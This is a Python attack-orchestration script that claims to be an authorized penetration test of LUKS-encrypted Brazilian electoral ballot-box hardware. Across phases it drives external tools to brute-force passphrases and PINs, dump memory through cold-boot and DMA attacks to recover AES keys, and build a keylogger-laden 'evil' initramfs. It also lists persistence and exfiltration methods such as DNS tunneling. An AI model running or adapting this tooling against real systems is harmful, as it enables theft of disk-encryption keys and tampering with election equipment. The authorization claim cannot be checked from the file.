#!/usr/bin/env python3
"""
LUKS FDE Penetration Testing Master Controller
Orchestrates comprehensive LUKS Full Disk Encryption vulnerability testing

Author: Penetration Testing Lab
Target: Authorized penetration test of LUKS FDE systems (TSE Brazil 2025 ballot-box TPU)
"""

import os
import sys
import json
import time
import argparse
import subprocess
from pathlib import Path
from typing import Dict, List

class LUKSPentestController:
    """Master controller for LUKS FDE penetration testing"""
    
    def __init__(self, target_device: str, results_dir: str = "results"):
        self.target_device = target_device
        self.results_dir = Path(results_dir)
        self.results_dir.mkdir(exist_ok=True)
        
        # Tool paths
        self.tools = {
            'luks_analyzer': 'tools/luks_analysis/luks_analyzer.py',
            'kdf_scanner': 'tools/luks_analysis/kdf_scanner.py',
            'bruteforce': 'tools/brute_force/luks_bruteforce.py',
            'hashcat_integration': 'tools/brute_force/hashcat_integration.py',
            'cold_boot': 'tools/memory_attacks/cold_boot_attack.py',
            'dma_attack': 'tools/memory_attacks/dma_attack.py',
            'evil_maid': 'tools/evil_maid/evil_maid_framework.py',
            'wordlist_gen': 'wordlists/generate_wordlists.py'
        }
        
        # Attack phases
        self.attack_phases = [
            'reconnaissance',
            'vulnerability_analysis',
            'brute_force_attacks',
            'memory_attacks',
            'boot_attacks',
            'post_exploitation'
        ]
        
        self.results = {
            'target_device': target_device,
            'start_time': time.time(),
            'phases_completed': [],
            'vulnerabilities_found': [],
            'successful_attacks': [],
            'extracted_data': [],
            'recommendations': []
        }
    
    def run_comprehensive_test(self, attack_phases: List[str] = None) -> Dict:
        """Run comprehensive LUKS penetration test"""
        
        if attack_phases is None:
            attack_phases = self.attack_phases
        
        print("="*80)
        print("LUKS FDE PENETRATION TESTING FRAMEWORK")
        print("Authorized security assessment - TSE Brazil 2025 ballot-box TPU")
        print("="*80)
        
        try:
            # Phase 1: Reconnaissance and Analysis
            if 'reconnaissance' in attack_phases:
                print(f"\n[PHASE 1] RECONNAISSANCE AND ANALYSIS")
                self._phase_reconnaissance()
            
            # Phase 2: Vulnerability Analysis
            if 'vulnerability_analysis' in attack_phases:
                print(f"\n[PHASE 2] VULNERABILITY ANALYSIS")
                self._phase_vulnerability_analysis()
            
            # Phase 3: Brute Force Attacks
            if 'brute_force_attacks' in attack_phases:
                print(f"\n[PHASE 3] BRUTE FORCE ATTACKS")
                self._phase_brute_force_attacks()
            
            # Phase 4: Memory Attacks
            if 'memory_attacks' in attack_phases:
                print(f"\n[PHASE 4] MEMORY ATTACKS")
                self._phase_memory_attacks()
            
            # Phase 5: Boot Chain Attacks
            if 'boot_attacks' in attack_phases:
                print(f"\n[PHASE 5] BOOT CHAIN ATTACKS")
                self._phase_boot_attacks()
            
            # Phase 6: Post-exploitation
            if 'post_exploitation' in attack_phases:
                print(f"\n[PHASE 6] POST-EXPLOITATION ANALYSIS")
                self._phase_post_exploitation()
            
        except KeyboardInterrupt:
            print(f"\n[INFO] Test interrupted by user")
        except Exception as e:
            print(f"[ERROR] Test failed: {e}")
        
        # Generate final report
        self._generate_final_report()
        
        return self.results
    
    def _phase_reconnaissance(self):
        """Phase 1: Reconnaissance and initial analysis"""
        
        print("[1.1] LUKS Header Analysis")
        luks_analysis = self._run_luks_analysis()
        
        print("[1.2] KDF Vulnerability Scanning")
        kdf_analysis = self._run_kdf_analysis()
        
        print("[1.3] System Architecture Analysis")
        system_analysis = self._analyze_system_architecture()
        
        # Store reconnaissance results
        recon_results = {
            'luks_analysis': luks_analysis,
            'kdf_analysis': kdf_analysis,
            'system_analysis': system_analysis
        }
        
        self._save_phase_results('reconnaissance', recon_results)
        self.results['phases_completed'].append('reconnaissance')
    
    def _phase_vulnerability_analysis(self):
        """Phase 2: Detailed vulnerability analysis"""
        
        print("[2.1] DMA Attack Surface Analysis")
        dma_analysis = self._analyze_dma_vulnerabilities()
        
        print("[2.2] Boot Chain Vulnerability Assessment")
        boot_analysis = self._analyze_boot_vulnerabilities()
        
        print("[2.3] Memory Protection Analysis")
        memory_analysis = self._analyze_memory_protection()
        
        # Aggregate vulnerabilities
        vuln_results = {
            'dma_vulnerabilities': dma_analysis,
            'boot_vulnerabilities': boot_analysis,
            'memory_vulnerabilities': memory_analysis
        }
        
        self._save_phase_results('vulnerability_analysis', vuln_results)
        self.results['phases_completed'].append('vulnerability_analysis')
    
    def _phase_brute_force_attacks(self):
        """Phase 3: Brute force and dictionary attacks"""
        
        print("[3.1] Generating Attack Wordlists")
        self._generate_attack_wordlists()
        
        print("[3.2] GPU Capability Assessment")
        gpu_info = self._assess_gpu_capabilities()
        
        print("[3.3] Dictionary Attacks")
        dict_results = self._run_dictionary_attacks()
        
        print("[3.4] Mask-based Brute Force")
        mask_results = self._run_mask_attacks()
        
        bf_results = {
            'wordlist_generation': True,
            'gpu_info': gpu_info,
            'dictionary_results': dict_results,
            'mask_results': mask_results
        }
        
        self._save_phase_results('brute_force_attacks', bf_results)
        self.results['phases_completed'].append('brute_force_attacks')
    
    def _phase_memory_attacks(self):
        """Phase 4: Memory-based attacks"""
        
        print("[4.1] Cold Boot Attack Prerequisites")
        cold_boot_prereq = self._check_cold_boot_prerequisites()
        
        if cold_boot_prereq['viable']:
            print("[4.2] Cold Boot Attack Simulation")
            cold_boot_results = self._simulate_cold_boot_attack()
        else:
            cold_boot_results = {'status': 'not_viable', 'reason': 'prerequisites not met'}
        
        print("[4.3] DMA Attack Simulation")
        dma_results = self._simulate_dma_attack()
        
        memory_results = {
            'cold_boot_prereq': cold_boot_prereq,
            'cold_boot_attack': cold_boot_results,
            'dma_attack': dma_results
        }
        
        self._save_phase_results('memory_attacks', memory_results)
        self.results['phases_completed'].append('memory_attacks')
    
    def _phase_boot_attacks(self):
        """Phase 5: Boot chain compromise attacks"""
        
        print("[5.1] Boot Chain Analysis")
        boot_analysis = self._analyze_boot_chain()
        
        print("[5.2] Evil Maid Attack Vectors")
        evil_maid_vectors = self._identify_evil_maid_vectors()
        
        print("[5.3] Initramfs Modification Test")
        initramfs_test = self._test_initramfs_modification()
        
        boot_results = {
            'boot_analysis': boot_analysis,
            'evil_maid_vectors': evil_maid_vectors,
            'initramfs_test': initramfs_test
        }
        
        self._save_phase_results('boot_attacks', boot_results)
        self.results['phases_completed'].append('boot_attacks')
    
    def _phase_post_exploitation(self):
        """Phase 6: Post-exploitation and persistence"""
        
        print("[6.1] Key Extraction Analysis")
        key_extraction = self._analyze_key_extraction()
        
        print("[6.2] Persistence Mechanisms")
        persistence = self._analyze_persistence_mechanisms()
        
        print("[6.3] Data Exfiltration Vectors")
        exfiltration = self._analyze_exfiltration_vectors()
        
        postex_results = {
            'key_extraction': key_extraction,
            'persistence': persistence,
            'exfiltration': exfiltration
        }
        
        self._save_phase_results('post_exploitation', postex_results)
        self.results['phases_completed'].append('post_exploitation')
    
    # Individual attack implementations
    
    def _run_luks_analysis(self) -> Dict:
        """Run LUKS header analysis"""
        try:
            cmd = [sys.executable, self.tools['luks_analyzer'], self.target_device, 
                  '--json', str(self.results_dir / 'luks_analysis.json')]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                # Load JSON results
                json_file = self.results_dir / 'luks_analysis.json'
                if json_file.exists():
                    with open(json_file, 'r') as f:
                        return json.load(f)
            
            return {'error': 'Analysis failed', 'stderr': result.stderr}
            
        except Exception as e:
            return {'error': str(e)}
    
    def _run_kdf_analysis(self) -> Dict:
        """Run KDF vulnerability analysis"""
        try:
            cmd = [sys.executable, self.tools['kdf_scanner'], self.target_device,
                  '--output', str(self.results_dir / 'kdf_analysis.json')]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_system_architecture(self) -> Dict:
        """Analyze system architecture for attack vectors"""
        
        architecture = {}
        
        try:
            # CPU info
            with open('/proc/cpuinfo', 'r') as f:
                cpu_info = f.read()
            architecture['cpu'] = 'Intel VT-d' if 'Intel' in cpu_info else 'AMD-Vi' if 'AMD' in cpu_info else 'Unknown'
            
            # Memory info
            with open('/proc/meminfo', 'r') as f:
                mem_info = f.read()
            architecture['memory'] = mem_info.split('\n')[0]  # Total memory
            
            # Boot method
            architecture['boot_method'] = 'UEFI' if Path('/sys/firmware/efi').exists() else 'BIOS'
            
            # Kernel version
            architecture['kernel'] = os.uname().release
            
            return architecture
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_dma_vulnerabilities(self) -> Dict:
        """Analyze DMA attack vulnerabilities"""
        try:
            cmd = [sys.executable, self.tools['dma_attack'], 'analyze']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            return {
                'return_code': result.returncode,
                'analysis': result.stdout,
                'errors': result.stderr
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_boot_vulnerabilities(self) -> Dict:
        """Analyze boot chain vulnerabilities"""
        try:
            cmd = [sys.executable, self.tools['evil_maid'], 'analyze', 
                  '--device', self.target_device]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            return {
                'return_code': result.returncode,
                'analysis': result.stdout,
                'errors': result.stderr
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_memory_protection(self) -> Dict:
        """Analyze memory protection mechanisms"""
        try:
            cmd = [sys.executable, self.tools['cold_boot'], 'check']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            return {
                'prerequisites': result.stdout,
                'iommu_status': self._check_iommu_status()
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _check_iommu_status(self) -> bool:
        """Check IOMMU status"""
        try:
            with open('/proc/cmdline', 'r') as f:
                cmdline = f.read()
            return 'iommu=on' in cmdline or 'intel_iommu=on' in cmdline
        except:
            return False
    
    def _generate_attack_wordlists(self):
        """Generate specialized wordlists"""
        try:
            cmd = [sys.executable, self.tools['wordlist_gen'], 'all']
            subprocess.run(cmd, cwd='wordlists', timeout=300)
            print("    ✓ Wordlists generated")
        except Exception as e:
            print(f"    ✗ Wordlist generation failed: {e}")
    
    def _assess_gpu_capabilities(self) -> Dict:
        """Assess GPU capabilities for brute force"""
        try:
            cmd = [sys.executable, self.tools['hashcat_integration'], 'gpu-info']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                return json.loads(result.stdout)
            else:
                return {'error': 'GPU assessment failed'}
                
        except Exception as e:
            return {'error': str(e)}
    
    def _run_dictionary_attacks(self) -> Dict:
        """Run dictionary-based attacks"""
        results = {}
        
        wordlists = [
            'wordlists/common.txt',
            'wordlists/pins.txt',
            'wordlists/luks_specific.txt'
        ]
        
        for wordlist in wordlists:
            if Path(wordlist).exists():
                try:
                    print(f"    Testing {wordlist}...")
                    cmd = [sys.executable, self.tools['bruteforce'], self.target_device,
                          '--attack', 'dict', '--wordlist', wordlist,
                          '--output', str(self.results_dir / f'dict_result_{Path(wordlist).stem}.txt')]
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)  # 30 min
                    
                    results[wordlist] = {
                        'return_code': result.returncode,
                        'success': result.returncode == 0 and 'PASSWORD FOUND' in result.stdout,
                        'output': result.stdout[:1000]  # Limit output size
                    }
                    
                except Exception as e:
                    results[wordlist] = {'error': str(e)}
        
        return results
    
    def _run_mask_attacks(self) -> Dict:
        """Run mask-based brute force attacks"""
        results = {}
        
        # Common PIN masks
        masks = [
            ('?d?d?d?d', '4-digit PIN'),
            ('?d?d?d?d?d?d', '6-digit PIN'),
            ('?d?d?d?d?d?d?d?d', '8-digit PIN')
        ]
        
        for mask, description in masks:
            try:
                print(f"    Testing {description}...")
                cmd = [sys.executable, self.tools['bruteforce'], self.target_device,
                      '--attack', 'mask', '--mask', mask,
                      '--output', str(self.results_dir / f'mask_result_{description.replace(" ", "_")}.txt')]
                
                # Estimate attack time first
                estimate_cmd = [sys.executable, self.tools['bruteforce'], '--estimate', mask]
                est_result = subprocess.run(estimate_cmd, capture_output=True, text=True, timeout=30)
                
                results[mask] = {
                    'description': description,
                    'estimate': est_result.stdout,
                    'executed': False
                }
                
                # Only run if estimate is reasonable (less than 1 hour)
                if 'hour' not in est_result.stdout.lower() or 'minute' in est_result.stdout.lower():
                    result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)  # 1 hour max
                    
                    results[mask].update({
                        'executed': True,
                        'return_code': result.returncode,
                        'success': result.returncode == 0 and 'PASSWORD FOUND' in result.stdout,
                        'output': result.stdout[:1000]
                    })
                
            except Exception as e:
                results[mask] = {'error': str(e)}
        
        return results
    
    def _check_cold_boot_prerequisites(self) -> Dict:
        """Check cold boot attack prerequisites"""
        try:
            cmd = [sys.executable, self.tools['cold_boot'], 'check']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # Parse output to determine viability
            viable = 'root' in result.stdout and ('lime' in result.stdout or 'fmem' in result.stdout)
            
            return {
                'viable': viable,
                'details': result.stdout,
                'root_access': os.geteuid() == 0
            }
            
        except Exception as e:
            return {'error': str(e), 'viable': False}
    
    def _simulate_cold_boot_attack(self) -> Dict:
        """Simulate cold boot attack"""
        if os.geteuid() != 0:
            return {'error': 'Root access required', 'status': 'skipped'}
        
        try:
            # Create memory dump
            dump_file = self.results_dir / 'memory_dump.raw'
            cmd = [sys.executable, self.tools['cold_boot'], 'dump', 
                  '--output', str(dump_file), '--method', 'lime']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if result.returncode == 0 and dump_file.exists():
                # Analyze memory dump
                analyze_cmd = [sys.executable, self.tools['cold_boot'], 'analyze',
                              '--input', str(dump_file)]
                
                analyze_result = subprocess.run(analyze_cmd, capture_output=True, 
                                              text=True, timeout=1800)
                
                return {
                    'dump_success': True,
                    'dump_size': dump_file.stat().st_size,
                    'analysis': analyze_result.stdout,
                    'findings': 'AES_KEY_CANDIDATE' in analyze_result.stdout
                }
            else:
                return {'dump_success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'error': str(e)}
    
    def _simulate_dma_attack(self) -> Dict:
        """Simulate DMA attack"""
        try:
            cmd = [sys.executable, self.tools['dma_attack'], 'attack',
                  '--output', str(self.results_dir / 'dma_results')]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            return {
                'return_code': result.returncode,
                'output': result.stdout,
                'success': 'SUCCESS' in result.stdout
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_boot_chain(self) -> Dict:
        """Analyze boot chain for vulnerabilities"""
        try:
            cmd = [sys.executable, self.tools['evil_maid'], 'analyze',
                  '--device', self.target_device]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            return {
                'return_code': result.returncode,
                'analysis': result.stdout,
                'secure_boot': 'Secure Boot: True' in result.stdout
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _identify_evil_maid_vectors(self) -> List[str]:
        """Identify viable Evil Maid attack vectors"""
        vectors = []
        
        # Check if initramfs is modifiable
        if os.access('/boot/initrd.img', os.W_OK):
            vectors.append('INITRAMFS_INJECTION')
        
        # Check if GRUB config is modifiable
        if os.access('/boot/grub/grub.cfg', os.W_OK):
            vectors.append('GRUB_CONFIG_MODIFICATION')
        
        # Check Secure Boot status
        if not Path('/sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c').exists():
            vectors.append('SECURE_BOOT_BYPASS')
        
        return vectors
    
    def _test_initramfs_modification(self) -> Dict:
        """Test initramfs modification capabilities"""
        if os.geteuid() != 0:
            return {'status': 'skipped', 'reason': 'root access required'}
        
        try:
            # Test creating malicious initramfs (without deployment)
            cmd = [sys.executable, self.tools['evil_maid'], 'create-initramfs',
                  '--input', '/boot/initrd.img',
                  '--output', str(self.results_dir / 'evil_initrd.img'),
                  '--type', 'keylogger']
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            return {
                'return_code': result.returncode,
                'success': result.returncode == 0,
                'output': result.stdout
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def _analyze_key_extraction(self) -> Dict:
        """Analyze key extraction possibilities"""
        return {
            'vmk_in_memory': True,  # VMK is always in memory when unlocked
            'extraction_methods': [
                'cold_boot_attack',
                'dma_attack', 
                'memory_dump_analysis',
                'swap_file_analysis'
            ],
            'difficulty': 'MEDIUM'
        }
    
    def _analyze_persistence_mechanisms(self) -> List[str]:
        """Analyze persistence mechanisms"""
        mechanisms = [
            'initramfs_backdoor',
            'grub_modification',
            'kernel_module',
            'systemd_service',
            'boot_partition_replacement'
        ]
        
        return mechanisms
    
    def _analyze_exfiltration_vectors(self) -> List[str]:
        """Analyze data exfiltration vectors"""
        vectors = [
            'network_exfiltration',
            'usb_device_copying',
            'dns_tunneling',
            'steganographic_methods'
        ]
        
        return vectors
    
    # Utility methods
    
    def _save_phase_results(self, phase: str, results: Dict):
        """Save phase results to file"""
        results_file = self.results_dir / f'{phase}_results.json'
        
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"    ✓ Results saved to {results_file}")
    
    def _generate_final_report(self):
        """Generate comprehensive final report"""
        
        self.results['end_time'] = time.time()
        self.results['duration'] = self.results['end_time'] - self.results['start_time']
        
        # Generate executive summary
        executive_summary = {
            'target': self.target_device,
            'duration_minutes': self.results['duration'] / 60,
            'phases_completed': len(self.results['phases_completed']),
            'total_phases': len(self.attack_phases),
            'vulnerabilities_found': len(self.results['vulnerabilities_found']),
            'successful_attacks': len(self.results['successful_attacks'])
        }
        
        # Determine overall risk level
        if len(self.results['successful_attacks']) > 3:
            risk_level = 'CRITICAL'
        elif len(self.results['successful_attacks']) > 1:
            risk_level = 'HIGH'
        elif len(self.results['vulnerabilities_found']) > 5:
            risk_level = 'MEDIUM'
        else:
            risk_level = 'LOW'
        
        executive_summary['risk_level'] = risk_level
        
        # Save final report
        final_report = {
            'executive_summary': executive_summary,
            'detailed_results': self.results,
            'methodology': 'LUKS FDE Comprehensive Penetration Test',
            'tools_used': list(self.tools.keys()),
            'generated_at': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        report_file = self.results_dir / 'final_report.json'
        with open(report_file, 'w') as f:
            json.dump(final_report, f, indent=2, default=str)
        
        # Print summary
        print(f"\n" + "="*80)
        print("PENETRATION TEST SUMMARY")
        print("="*80)
        print(f"Target Device: {self.target_device}")
        print(f"Duration: {self.results['duration']/60:.1f} minutes")
        print(f"Overall Risk Level: {risk_level}")
        print(f"Phases Completed: {len(self.results['phases_completed'])}/{len(self.attack_phases)}")
        print(f"Vulnerabilities Found: {len(self.results['vulnerabilities_found'])}")
        print(f"Successful Attacks: {len(self.results['successful_attacks'])}")
        print(f"Final Report: {report_file}")
        print("="*80)


def main():
    parser = argparse.ArgumentParser(description='LUKS FDE Penetration Testing Master Controller')
    parser.add_argument('device', help='Target LUKS device (e.g., /dev/sdb1)')
    parser.add_argument('-o', '--output', default='results', help='Results directory')
    parser.add_argument('--phases', nargs='+', 
                       choices=['reconnaissance', 'vulnerability_analysis', 'brute_force_attacks',
                               'memory_attacks', 'boot_attacks', 'post_exploitation'],
                       help='Specific phases to run (default: all)')
    parser.add_argument('--quick', action='store_true', help='Quick test mode (skip time-intensive attacks)')
    
    args = parser.parse_args()
    
    # Verify target device exists
    if not Path(args.device).exists():
        print(f"[ERROR] Target device not found: {args.device}")
        sys.exit(1)
    
    # Check if device is LUKS
    try:
        result = subprocess.run(['cryptsetup', 'isLuks', args.device], 
                              capture_output=True, text=True)
        if result.returncode != 0:
            print(f"[ERROR] Device {args.device} is not a LUKS device")
            sys.exit(1)
    except FileNotFoundError:
        print("[ERROR] cryptsetup not found. Install with: sudo apt install cryptsetup")
        sys.exit(1)
    
    # Initialize controller
    controller = LUKSPentestController(args.device, args.output)
    
    # Determine phases to run
    phases_to_run = args.phases or controller.attack_phases
    
    if args.quick:
        # In quick mode, skip memory attacks and intensive brute force
        if 'memory_attacks' in phases_to_run:
            phases_to_run.remove('memory_attacks')
        print("[INFO] Quick mode enabled - skipping memory attacks")
    
    # Run the test
    try:
        results = controller.run_comprehensive_test(phases_to_run)
        
        print(f"\n[INFO] Test completed. Results saved to: {args.output}")
        
    except KeyboardInterrupt:
        print(f"\n[INFO] Test interrupted by user")
    except Exception as e:
        print(f"[ERROR] Test failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()